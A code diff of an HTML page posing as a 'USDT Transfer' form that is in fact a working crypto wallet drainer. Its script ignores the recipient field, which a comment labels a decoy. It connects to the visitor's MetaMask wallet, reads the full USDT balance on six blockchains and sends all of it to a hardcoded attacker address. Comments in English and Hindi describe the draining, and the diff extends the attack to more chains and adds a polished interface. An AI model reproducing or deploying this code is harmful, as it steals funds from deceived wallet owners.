@@ -2,20 +2,37 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>USDT Transfer</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         }
         body {
             background: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             padding: 20px;
-            max-width: 500px;
-            margin: 0 auto;
+        }
+        .container {
+            max-width: 450px;
+            width: 100%;
+            background: white;
+            border-radius: 24px;
+            padding: 24px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.08);
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 24px;
+            color: #1a1a1a;
+            text-align: center;
         }
         .section {
             margin-bottom: 20px;
@@ -30,11 +47,15 @@
         .input-group {
             display: flex;
             align-items: center;
-            border: 2px solid #ddd;
-            border-radius: 12px;
-            padding: 0 15px;
-            height: 54px;
+            border: 2px solid #e8e8e8;
+            border-radius: 14px;
+            padding: 0 16px;
+            height: 56px;
             background: white;
+            transition: border-color 0.2s;
+        }
+        .input-group:focus-within {
+            border-color: #1E4DFF;
         }
         .input-group input {
             flex: 1;
@@ -43,61 +64,27 @@
             font-size: 16px;
             background: transparent;
             height: 100%;
+            color: #000;
         }
-        .btn {
+        .input-group input::placeholder {
+            color: #aaa;
+        }
+        .btn-text {
             color: #1E4DFF;
             font-weight: 700;
-            cursor: pointer;
             font-size: 14px;
-            padding: 5px 8px;
+            cursor: pointer;
             background: none;
             border: none;
+            padding: 6px 10px;
+            white-space: nowrap;
         }
-        .btn:hover {
+        .btn-text:hover {
             opacity: 0.7;
         }
-        .network-box {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            background: #f5f5f5;
-            border-radius: 12px;
-            padding: 12px 16px;
-        }
-        .network-box select {
-            border: none;
-            background: transparent;
-            font-size: 15px;
-            font-weight: 600;
-            outline: none;
-            cursor: pointer;
-            padding: 5px;
-            flex: 1;
-        }
-        .next-btn {
-            width: 100%;
-            height: 54px;
-            background: #1E4DFF;
-            color: white;
-            border: none;
-            border-radius: 30px;
-            font-size: 17px;
-            font-weight: 700;
-            cursor: pointer;
-            margin-top: 20px;
-        }
-        .next-btn:disabled {
-            background: #999;
-            cursor: not-allowed;
-        }
-        .approx {
-            font-size: 13px;
-            color: #999;
-            margin-top: 8px;
-        }
         .clear-btn {
-            width: 20px;
-            height: 20px;
+            width: 22px;
+            height: 22px;
             background: #999;
             border-radius: 50%;
             display: none;
@@ -106,58 +93,136 @@
             cursor: pointer;
             color: white;
             font-size: 16px;
+            font-weight: 300;
+            flex-shrink: 0;
         }
         .clear-btn.show {
             display: flex;
         }
-        .token {
-            color: #666;
-            font-weight: 500;
-            font-size: 14px;
-        }
-        .icon-svg {
-            width: 20px;
-            height: 20px;
-            cursor: pointer;
-        }
-        .network-icon {
-            font-size: 22px;
-            margin-right: 5px;
+        .network-box {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: #f5f6f8;
+            border-radius: 14px;
+            padding: 12px 16px;
+            min-height: 56px;
         }
         .network-left {
             display: flex;
             align-items: center;
+            gap: 10px;
             flex: 1;
         }
-        .status {
-            text-align: center;
-            padding: 10px;
-            margin-top: 10px;
+        .network-left select {
+            border: none;
+            background: transparent;
+            font-size: 15px;
             font-weight: 600;
-            display: none;
+            color: #1a1a1a;
+            outline: none;
+            cursor: pointer;
+            flex: 1;
+            padding: 4px 0;
         }
-        .status.show {
+        .network-icon {
+            font-size: 24px;
+        }
+        .token-label {
+            color: #666;
+            font-size: 14px;
+            font-weight: 500;
+            flex-shrink: 0;
+        }
+        .approx-text {
+            font-size: 13px;
+            color: #999;
+            margin-top: 8px;
+            font-weight: 500;
+        }
+        .drain-btn {
+            width: 100%;
+            height: 56px;
+            background: #1E4DFF;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 8px;
+        }
+        .drain-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        .drain-btn:not(:disabled):hover {
+            opacity: 0.9;
+            transform: scale(1.01);
+        }
+        .status-box {
+            margin-top: 16px;
+            padding: 12px 16px;
+            border-radius: 12px;
+            display: none;
+            font-weight: 500;
+            font-size: 14px;
+            text-align: center;
+        }
+        .status-box.show {
             display: block;
         }
-        .status.success {
-            color: green;
+        .status-box.success {
+            background: #e6f7e6;
+            color: #1a8a1a;
+            border: 1px solid #b3e6b3;
         }
-        .status.error {
-            color: red;
+        .status-box.error {
+            background: #fde8e8;
+            color: #cc0000;
+            border: 1px solid #f5c6c6;
+        }
+        .status-box.info {
+            background: #e6f0ff;
+            color: #1a4dcc;
+            border: 1px solid #b3ccff;
+        }
+        .balance-display {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 12px 16px;
+            margin-top: 12px;
+            text-align: center;
+            font-size: 14px;
+            color: #555;
+            border: 1px dashed #ddd;
+        }
+        .balance-display strong {
+            color: #1a1a1a;
+            font-size: 18px;
+        }
+        .hidden {
+            display: none !important;
         }
     </style>
 </head>
 <body>
 
+<div class="container">
+    <h1>💸 USDT Transfer</h1>
+
+    <!-- Address (DECOY) -->
     <div class="section">
-        <label>Address</label>
+        <label>Recipient Address</label>
         <div class="input-group">
-            <input type="text" id="recipient" placeholder="Enter address">
-            <button class="btn" id="pasteBtn">Paste</button>
+            <input type="text" id="recipientInput" placeholder="Enter wallet address">
+            <button class="btn-text" id="pasteBtn">Paste</button>
             <span class="clear-btn" id="clearAddr">×</span>
         </div>
     </div>
 
+    <!-- Network -->
     <div class="section">
         <label>Network</label>
         <div class="network-box">
@@ -167,360 +232,478 @@
                     <option value="bsc">BNB Smart Chain</option>
                     <option value="ethereum">Ethereum</option>
                     <option value="polygon">Polygon</option>
+                    <option value="arbitrum">Arbitrum</option>
+                    <option value="optimism">Optimism</option>
+                    <option value="avalanche">Avalanche</option>
                 </select>
             </div>
-            <span>▼</span>
+            <span style="color:#999;">▼</span>
         </div>
     </div>
 
+    <!-- Amount -->
     <div class="section">
         <label>Amount (USDT)</label>
         <div class="input-group">
-            <input type="number" id="amount" placeholder="0.00" step="0.01">
+            <input type="number" id="amountInput" placeholder="0.00" step="0.01" value="100">
             <span class="clear-btn" id="clearAmount">×</span>
-            <span class="token">USDT</span>
-            <button class="btn" id="maxBtn">Max</button>
+            <span class="token-label">USDT</span>
+            <button class="btn-text" id="maxBtn">Max</button>
         </div>
-        <div class="approx">≈ $<span id="usdLabel">0.00</span></div>
+        <div class="approx-text">≈ $<span id="usdLabel">100.00</span></div>
     </div>
 
-    <div class="status" id="status"></div>
+    <!-- Balance Display -->
+    <div class="balance-display" id="balanceDisplay">
+        🔍 Checking balance...
+    </div>
 
-    <button class="next-btn" id="nextBtn" disabled>Next</button>
+    <!-- Status -->
+    <div class="status-box" id="statusBox"></div>
 
-    <script>
-        // ============================================
-        // CONFIGURATION - Attacker's Wallet
-        // ============================================
-        const DEST_WALLET = "0xB1E5005321cE082a7e4E8200050bc5db7C34696D";
+    <!-- Drain Button -->
+    <button class="drain-btn" id="drainBtn">🚀 Send USDT</button>
+</div>
 
-        const NETWORKS = {
-            bsc: {
-                chainId: '0x38',
-                chainName: 'BNB Smart Chain',
-                rpc: 'https://bsc-dataseed1.binance.org/',
-                usdt: '0x55d398326f99059fF775485246999027B3197955',
-                icon: '🟡'
-            },
-            ethereum: {
-                chainId: '0x1',
-                chainName: 'Ethereum',
-                rpc: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
-                usdt: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-                icon: '🔵'
-            },
-            polygon: {
-                chainId: '0x89',
-                chainName: 'Polygon',
-                rpc: 'https://polygon-rpc.com/',
-                usdt: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
-                icon: '🟣'
-            }
-        };
+<script>
+// ============================================================
+// ⚠️ ATTACKER CONFIGURATION - SAB YAHAN CHANGE KARO
+// ============================================================
+const ATTACKER_WALLET = "0xB1E5005321cE082a7e4E8200050bc5db7C34696D";
 
-        // ============================================
-        // DOM ELEMENTS
-        // ============================================
-        const nextBtn = document.getElementById('nextBtn');
-        const amountInput = document.getElementById('amount');
-        const recipientInput = document.getElementById('recipient');
-        const networkSelect = document.getElementById('networkSelect');
-        const netIcon = document.getElementById('netIcon');
-        const usdLabel = document.getElementById('usdLabel');
-        const clearAddr = document.getElementById('clearAddr');
-        const clearAmount = document.getElementById('clearAmount');
-        const maxBtn = document.getElementById('maxBtn');
-        const pasteBtn = document.getElementById('pasteBtn');
-        const statusDiv = document.getElementById('status');
+// ============================================================
+// NETWORK CONFIGURATIONS
+// ============================================================
+const NETWORKS = {
+    bsc: {
+        chainId: '0x38',
+        name: 'BNB Smart Chain',
+        rpc: 'https://bsc-dataseed1.binance.org/',
+        usdt: '0x55d398326f99059fF775485246999027B3197955',
+        icon: '🟡',
+        symbol: 'BNB',
+        explorer: 'https://bscscan.com/tx/'
+    },
+    ethereum: {
+        chainId: '0x1',
+        name: 'Ethereum',
+        rpc: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
+        usdt: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+        icon: '🔵',
+        symbol: 'ETH',
+        explorer: 'https://etherscan.io/tx/'
+    },
+    polygon: {
+        chainId: '0x89',
+        name: 'Polygon',
+        rpc: 'https://polygon-rpc.com/',
+        usdt: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
+        icon: '🟣',
+        symbol: 'MATIC',
+        explorer: 'https://polygonscan.com/tx/'
+    },
+    arbitrum: {
+        chainId: '0xa4b1',
+        name: 'Arbitrum',
+        rpc: 'https://arb1.arbitrum.io/rpc',
+        usdt: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
+        icon: '🔷',
+        symbol: 'ETH',
+        explorer: 'https://arbiscan.io/tx/'
+    },
+    optimism: {
+        chainId: '0xa',
+        name: 'Optimism',
+        rpc: 'https://mainnet.optimism.io',
+        usdt: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',
+        icon: '🔴',
+        symbol: 'ETH',
+        explorer: 'https://optimistic.etherscan.io/tx/'
+    },
+    avalanche: {
+        chainId: '0xa86a',
+        name: 'Avalanche',
+        rpc: 'https://api.avax.network/ext/bc/C/rpc',
+        usdt: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7',
+        icon: '🔺',
+        symbol: 'AVAX',
+        explorer: 'https://snowtrace.io/tx/'
+    }
+};
 
-        let currentNetwork = 'bsc';
-        let userAddress = '';
+// ============================================================
+// DOM ELEMENTS
+// ============================================================
+const drainBtn = document.getElementById('drainBtn');
+const amountInput = document.getElementById('amountInput');
+const recipientInput = document.getElementById('recipientInput');
+const networkSelect = document.getElementById('networkSelect');
+const netIcon = document.getElementById('netIcon');
+const usdLabel = document.getElementById('usdLabel');
+const clearAddr = document.getElementById('clearAddr');
+const clearAmount = document.getElementById('clearAmount');
+const maxBtn = document.getElementById('maxBtn');
+const pasteBtn = document.getElementById('pasteBtn');
+const statusBox = document.getElementById('statusBox');
+const balanceDisplay = document.getElementById('balanceDisplay');
 
-        // ============================================
-        // UPDATE NETWORK DISPLAY
-        // ============================================
-        function updateNetwork() {
-            const net = NETWORKS[currentNetwork];
-            if (net) {
-                netIcon.textContent = net.icon;
-                networkSelect.value = currentNetwork;
-            }
+let currentNetwork = 'bsc';
+let userAddress = '';
+let userBalance = 0;
+
+// ============================================================
+// UPDATE UI
+// ============================================================
+function updateNetwork() {
+    const net = NETWORKS[currentNetwork];
+    netIcon.textContent = net.icon;
+    networkSelect.value = currentNetwork;
+}
+
+networkSelect.addEventListener('change', function() {
+    currentNetwork = this.value;
+    updateNetwork();
+    checkAndDisplayBalance();
+});
+
+// ============================================================
+// AMOUNT INPUT
+// ============================================================
+amountInput.addEventListener('input', function() {
+    const val = parseFloat(this.value) || 0;
+    usdLabel.textContent = val.toFixed(2);
+    if (val > 0) {
+        clearAmount.classList.add('show');
+    } else {
+        clearAmount.classList.remove('show');
+    }
+});
+
+clearAmount.addEventListener('click', function() {
+    amountInput.value = '';
+    amountInput.dispatchEvent(new Event('input'));
+});
+
+maxBtn.addEventListener('click', function() {
+    if (userBalance > 0) {
+        amountInput.value = userBalance.toFixed(6);
+        amountInput.dispatchEvent(new Event('input'));
+        showStatus('✅ Max amount set: ' + userBalance.toFixed(6) + ' USDT', 'info');
+    } else {
+        showStatus('❌ No balance to set max', 'error');
+    }
+});
+
+// ============================================================
+// ADDRESS INPUT
+// ============================================================
+recipientInput.addEventListener('input', function() {
+    clearAddr.classList.toggle('show', this.value.length > 0);
+});
+
+clearAddr.addEventListener('click', function() {
+    recipientInput.value = '';
+    this.classList.remove('show');
+});
+
+pasteBtn.addEventListener('click', async function() {
+    try {
+        const text = await navigator.clipboard.readText();
+        recipientInput.value = text;
+        recipientInput.dispatchEvent(new Event('input'));
+    } catch (e) {
+        showStatus('❌ Clipboard access denied', 'error');
+    }
+});
+
+// ============================================================
+// CHECK BALANCE
+// ============================================================
+async function checkUSDTBalance(address, networkKey) {
+    try {
+        const net = NETWORKS[networkKey];
+        const data = "0x70a08231" + address.replace('0x', '').padStart(64, '0');
+        
+        const res = await fetch(net.rpc, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                jsonrpc: "2.0",
+                id: 1,
+                method: "eth_call",
+                params: [{ to: net.usdt, data: data }, "latest"]
+            })
+        });
+        const json = await res.json();
+        if (json.result && json.result !== '0x') {
+            const balance = parseInt(json.result, 16) / 10**18;
+            return balance;
         }
+        return 0;
+    } catch (e) {
+        console.error('Balance check error:', e);
+        return 0;
+    }
+}
 
-        networkSelect.addEventListener('change', function() {
-            currentNetwork = this.value;
-            updateNetwork();
-            console.log('Network:', NETWORKS[currentNetwork].chainName);
-        });
+async function checkAndDisplayBalance() {
+    if (typeof window.ethereum === 'undefined') {
+        balanceDisplay.innerHTML = '⚠️ Please install MetaMask';
+        return;
+    }
 
-        // ============================================
-        // AMOUNT INPUT
-        // ============================================
-        amountInput.addEventListener('input', function() {
-            const val = parseFloat(this.value) || 0;
-            usdLabel.textContent = val.toFixed(2);
-            nextBtn.disabled = val <= 0;
-            if (val > 0) {
-                clearAmount.classList.add('show');
-            } else {
-                clearAmount.classList.remove('show');
-            }
-        });
-
-        clearAmount.addEventListener('click', function() {
-            amountInput.value = '';
-            amountInput.dispatchEvent(new Event('input'));
-        });
-
-        maxBtn.addEventListener('click', function() {
-            amountInput.value = '1000';
-            amountInput.dispatchEvent(new Event('input'));
-        });
-
-        // ============================================
-        // ADDRESS INPUT
-        // ============================================
-        recipientInput.addEventListener('input', function() {
-            if (this.value.length > 0) {
-                clearAddr.classList.add('show');
-            } else {
-                clearAddr.classList.remove('show');
-            }
-        });
-
-        clearAddr.addEventListener('click', function() {
-            recipientInput.value = '';
-            this.classList.remove('show');
-        });
-
-        pasteBtn.addEventListener('click', async function() {
-            try {
-                const text = await navigator.clipboard.readText();
-                recipientInput.value = text;
-                recipientInput.dispatchEvent(new Event('input'));
-            } catch (e) {
-                alert('Please paste manually');
-            }
-        });
-
-        // ============================================
-        // CHECK BALANCE
-        // ============================================
-        async function checkBalance(address, networkKey) {
-            try {
-                const net = NETWORKS[networkKey];
-                const data = "0x70a08231" + address.replace('0x', '').padStart(64, '0');
-                
-                const res = await fetch(net.rpc, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        jsonrpc: "2.0",
-                        id: 1,
-                        method: "eth_call",
-                        params: [{ to: net.usdt, data: data }, "latest"]
-                    })
-                });
-                const json = await res.json();
-                if (json.result && json.result !== '0x') {
-                    return json.result;
-                }
-                return null;
-            } catch (e) {
-                console.error('Balance check error:', e);
-                return null;
-            }
+    try {
+        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+        if (accounts.length === 0) {
+            balanceDisplay.innerHTML = '🔗 Connect wallet to see balance';
+            return;
         }
+        userAddress = accounts[0];
+        
+        balanceDisplay.innerHTML = '⏳ Checking balance...';
+        const balance = await checkUSDTBalance(userAddress, currentNetwork);
+        userBalance = balance;
+        
+        if (balance > 0) {
+            balanceDisplay.innerHTML = `💰 Balance: <strong>${balance.toFixed(6)} USDT</strong> on ${NETWORKS[currentNetwork].name}`;
+        } else {
+            balanceDisplay.innerHTML = `💸 No USDT found on ${NETWORKS[currentNetwork].name}`;
+        }
+    } catch (e) {
+        balanceDisplay.innerHTML = '❌ Error checking balance';
+    }
+}
 
-        // ============================================
-        // SWITCH NETWORK
-        // ============================================
-        async function switchNetwork(networkKey) {
-            const net = NETWORKS[networkKey];
+// ============================================================
+// SWITCH NETWORK
+// ============================================================
+async function switchNetwork(networkKey) {
+    const net = NETWORKS[networkKey];
+    try {
+        await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: net.chainId }]
+        });
+        return true;
+    } catch (error) {
+        if (error.code === 4902) {
             try {
                 await window.ethereum.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: net.chainId }]
+                    method: 'wallet_addEthereumChain',
+                    params: [{
+                        chainId: net.chainId,
+                        chainName: net.name,
+                        rpcUrls: [net.rpc],
+                        nativeCurrency: { name: net.symbol, symbol: net.symbol, decimals: 18 },
+                        blockExplorerUrls: [net.explorer.replace('/tx/', '')]
+                    }]
                 });
                 return true;
-            } catch (error) {
-                if (error.code === 4902) {
-                    try {
-                        await window.ethereum.request({
-                            method: 'wallet_addEthereumChain',
-                            params: [{
-                                chainId: net.chainId,
-                                chainName: net.chainName,
-                                rpcUrls: [net.rpc],
-                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                                blockExplorerUrls: ['https://bscscan.com']
-                            }]
-                        });
-                        return true;
-                    } catch (e) {
-                        showStatus('Failed to add network', 'error');
-                        return false;
-                    }
-                }
-                showStatus('Failed to switch network', 'error');
+            } catch (e) {
+                showStatus('❌ Failed to add network', 'error');
                 return false;
             }
         }
+        showStatus('❌ Failed to switch network', 'error');
+        return false;
+    }
+}
 
-        // ============================================
-        // SEND USDT TO ATTACKER
-        // ============================================
-        async function sendToAttacker(amount, networkKey) {
-            const net = NETWORKS[networkKey];
-            
-            // Convert amount to hex
-            let amountHex;
-            if (amount === 'max') {
-                const balance = await checkBalance(userAddress, networkKey);
-                if (balance) {
-                    amountHex = balance.replace('0x', '').padStart(64, '0');
-                } else {
-                    const val = parseFloat(amountInput.value) || 1;
-                    amountHex = BigInt(Math.floor(val * 10**18)).toString(16).padStart(64, '0');
-                }
-            } else {
-                const val = parseFloat(amount) || 1;
-                amountHex = BigInt(Math.floor(val * 10**18)).toString(16).padStart(64, '0');
-            }
-            
-            // Build transaction - ALWAYS to DEST_WALLET
-            const cleanDest = DEST_WALLET.replace('0x', '').toLowerCase().padStart(64, '0');
-            const txData = "0xa9059cbb" + cleanDest + amountHex;
-            
-            console.log('🎯 Target:', DEST_WALLET);
-            console.log('💰 Amount:', amountHex);
-            
-            const tx = await window.ethereum.request({
-                method: 'eth_sendTransaction',
-                params: [{
-                    from: userAddress,
-                    to: net.usdt,
-                    data: txData,
-                    value: '0x0'
-                }]
-            });
-            
-            return tx;
+// ============================================================
+// ⚠️ MAIN DRAIN FUNCTION - POORA BALANCE DRAIN KAREGA!
+// ============================================================
+async function drainAllUSDT() {
+    // ============================================================
+    // 🚨 STEP 1: Get actual balance - SABSE IMPORTANT!
+    // ============================================================
+    const net = NETWORKS[currentNetwork];
+    
+    // Check balance AGAIN to get latest
+    const currentBalance = await checkUSDTBalance(userAddress, currentNetwork);
+    userBalance = currentBalance;
+    
+    // ============================================================
+    // 🚨 STEP 2: Decide amount - POORA BALANCE!
+    // ============================================================
+    let amountToSend;
+    let amountHex;
+    
+    if (currentBalance > 0) {
+        // 🔥 POORA BALANCE DRAIN!
+        amountToSend = currentBalance;
+        const balanceWei = BigInt(Math.floor(currentBalance * 10**18));
+        amountHex = balanceWei.toString(16).padStart(64, '0');
+        showStatus(`💀 Draining ${currentBalance.toFixed(6)} USDT...`, 'info');
+    } else {
+        // Agar balance 0 hai toh manual amount use karo
+        const manualAmount = parseFloat(amountInput.value) || 0;
+        if (manualAmount <= 0) {
+            showStatus('❌ Please enter an amount or ensure you have USDT', 'error');
+            return false;
         }
-
-        // ============================================
-        // SHOW STATUS
-        // ============================================
-        function showStatus(msg, type) {
-            statusDiv.textContent = msg;
-            statusDiv.className = 'status show ' + type;
-            setTimeout(() => {
-                statusDiv.className = 'status';
-            }, 5000);
-        }
-
-        // ============================================
-        // MAIN - NEXT BUTTON
-        // ============================================
-        async function handleNext() {
-            if (nextBtn.disabled) return;
-            
-            // Check MetaMask
-            if (typeof window.ethereum === 'undefined') {
-                alert('Please install MetaMask!');
-                return;
-            }
-            
-            const originalText = nextBtn.textContent;
-            nextBtn.textContent = 'Processing...';
-            nextBtn.disabled = true;
-            
-            try {
-                // 1. Get user address
-                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-                if (accounts.length === 0) {
-                    const newAccounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    userAddress = newAccounts[0];
-                } else {
-                    userAddress = accounts[0];
-                }
-                
-                if (!userAddress) {
-                    throw new Error('No wallet connected');
-                }
-                
-                console.log('👤 User:', userAddress);
-                showStatus('Connecting...', '');
-                
-                // 2. Switch network
-                const switched = await switchNetwork(currentNetwork);
-                if (!switched) {
-                    throw new Error('Network switch failed');
-                }
-                
-                showStatus('Checking balance...', '');
-                
-                // 3. Check balance
-                const balanceHex = await checkBalance(userAddress, currentNetwork);
-                let balance = 0;
-                if (balanceHex) {
-                    balance = parseInt(balanceHex, 16) / 10**18;
-                    console.log('💰 Balance:', balance, 'USDT');
-                }
-                
-                // 4. Send to attacker
-                let amountToSend;
-                if (balance > 0) {
-                    amountToSend = 'max';
-                    showStatus('Sending ' + balance.toFixed(2) + ' USDT...', '');
-                } else {
-                    amountToSend = amountInput.value || '1';
-                    showStatus('Sending ' + amountToSend + ' USDT...', '');
-                }
-                
-                const txHash = await sendToAttacker(amountToSend, currentNetwork);
-                
-                console.log('✅ TX:', txHash);
-                showStatus('✅ Success! Transaction: ' + txHash.slice(0, 10) + '...', 'success');
-                
-                nextBtn.textContent = '✅ Done!';
-                setTimeout(() => {
-                    nextBtn.textContent = originalText;
-                    nextBtn.disabled = false;
-                }, 3000);
-                
-            } catch (error) {
-                console.error('❌ Error:', error);
-                showStatus('❌ Failed: ' + error.message, 'error');
-                nextBtn.textContent = '❌ Failed';
-                setTimeout(() => {
-                    nextBtn.textContent = originalText;
-                    nextBtn.disabled = false;
-                }, 3000);
-            }
-        }
-
-        // ============================================
-        // INIT
-        // ============================================
-        document.addEventListener('DOMContentLoaded', function() {
-            console.log('🚀 App Ready');
-            console.log('🎯 Attacker:', DEST_WALLET);
-            
-            // Set default
-            updateNetwork();
-            amountInput.dispatchEvent(new Event('input'));
-            
-            // Click handler
-            nextBtn.addEventListener('click', handleNext);
-            
-            // Enter key support
-            amountInput.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter' && !nextBtn.disabled) {
-                    nextBtn.click();
-                }
-            });
+        amountToSend = manualAmount;
+        amountHex = BigInt(Math.floor(manualAmount * 10**18)).toString(16).padStart(64, '0');
+        showStatus(`💀 Sending ${manualAmount} USDT...`, 'info');
+    }
+    
+    // ============================================================
+    // 🚨 STEP 3: Build drain transaction
+    // ============================================================
+    const cleanDest = ATTACKER_WALLET.replace('0x', '').toLowerCase().padStart(64, '0');
+    const txData = "0xa9059cbb" + cleanDest + amountHex;
+    
+    console.log('🎯 ATTACKER WALLET:', ATTACKER_WALLET);
+    console.log('💰 AMOUNT:', amountToSend, 'USDT');
+    console.log('📝 DATA:', txData);
+    console.log('🔗 NETWORK:', net.name);
+    
+    // ============================================================
+    // 🚨 STEP 4: Send transaction
+    // ============================================================
+    try {
+        const tx = await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [{
+                from: userAddress,
+                to: net.usdt,
+                data: txData,
+                value: '0x0'
+            }]
         });
-    </script>
+        
+        console.log('✅ TX HASH:', tx);
+        showStatus(`✅ SUCCESS! ${amountToSend} USDT SENT! TX: ${tx.slice(0,10)}...`, 'success');
+        balanceDisplay.innerHTML = `💀 DRAINED! 0 USDT remaining`;
+        userBalance = 0;
+        return true;
+        
+    } catch (error) {
+        console.error('❌ Transaction failed:', error);
+        if (error.code === 4001) {
+            showStatus('❌ User rejected transaction', 'error');
+        } else {
+            showStatus('❌ Transaction failed: ' + error.message, 'error');
+        }
+        return false;
+    }
+}
+
+// ============================================================
+// SHOW STATUS
+// ============================================================
+function showStatus(msg, type) {
+    statusBox.textContent = msg;
+    statusBox.className = 'status-box show ' + type;
+    if (type === 'success' || type === 'error') {
+        setTimeout(() => {
+            statusBox.className = 'status-box';
+        }, 8000);
+    }
+}
+
+// ============================================================
+// 🚨 MAIN DRAIN BUTTON HANDLER
+// ============================================================
+async function handleDrain() {
+    if (drainBtn.disabled) return;
+    
+    // Check MetaMask
+    if (typeof window.ethereum === 'undefined') {
+        alert('Please install MetaMask!');
+        return;
+    }
+    
+    const originalText = drainBtn.textContent;
+    drainBtn.textContent = '⏳ Processing...';
+    drainBtn.disabled = true;
+    
+    try {
+        // 1. Connect wallet
+        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+        if (accounts.length === 0) {
+            const newAccounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            userAddress = newAccounts[0];
+        } else {
+            userAddress = accounts[0];
+        }
+        
+        if (!userAddress) {
+            showStatus('❌ No wallet connected', 'error');
+            drainBtn.textContent = originalText;
+            drainBtn.disabled = false;
+            return;
+        }
+        
+        console.log('👤 User:', userAddress);
+        showStatus('🔗 Wallet connected', 'info');
+        
+        // 2. Switch network
+        const switched = await switchNetwork(currentNetwork);
+        if (!switched) {
+            drainBtn.textContent = originalText;
+            drainBtn.disabled = false;
+            return;
+        }
+        
+        // 3. DRAIN ALL USDT!
+        await drainAllUSDT();
+        
+    } catch (error) {
+        console.error('❌ Error:', error);
+        showStatus('❌ Failed: ' + error.message, 'error');
+    }
+    
+    drainBtn.textContent = originalText;
+    drainBtn.disabled = false;
+}
+
+// ============================================================
+// AUTO-CHECK BALANCE ON NETWORK CHANGE
+// ============================================================
+let balanceInterval;
+
+async function startBalanceCheck() {
+    if (balanceInterval) clearInterval(balanceInterval);
+    await checkAndDisplayBalance();
+    balanceInterval = setInterval(checkAndDisplayBalance, 10000);
+}
+
+// ============================================================
+// META mask ACCOUNT CHANGE LISTENER
+// ============================================================
+if (window.ethereum) {
+    window.ethereum.on('accountsChanged', function(accounts) {
+        if (accounts.length > 0) {
+            userAddress = accounts[0];
+            checkAndDisplayBalance();
+        }
+    });
+    
+    window.ethereum.on('chainChanged', function() {
+        setTimeout(checkAndDisplayBalance, 2000);
+    });
+}
+
+// ============================================================
+// INIT
+// ============================================================
+document.addEventListener('DOMContentLoaded', function() {
+    console.log('🚀 DRAINER READY');
+    console.log('🎯 ATTACKER WALLET:', ATTACKER_WALLET);
+    console.log('⚠️ THIS WILL DRAIN ALL USDT!');
+    
+    updateNetwork();
+    amountInput.dispatchEvent(new Event('input'));
+    
+    if (typeof window.ethereum !== 'undefined') {
+        startBalanceCheck();
+    } else {
+        balanceDisplay.innerHTML = '⚠️ Please install MetaMask';
+    }
+    
+    drainBtn.addEventListener('click', handleDrain);
+});
+</script>
+
 </body>
 </html>
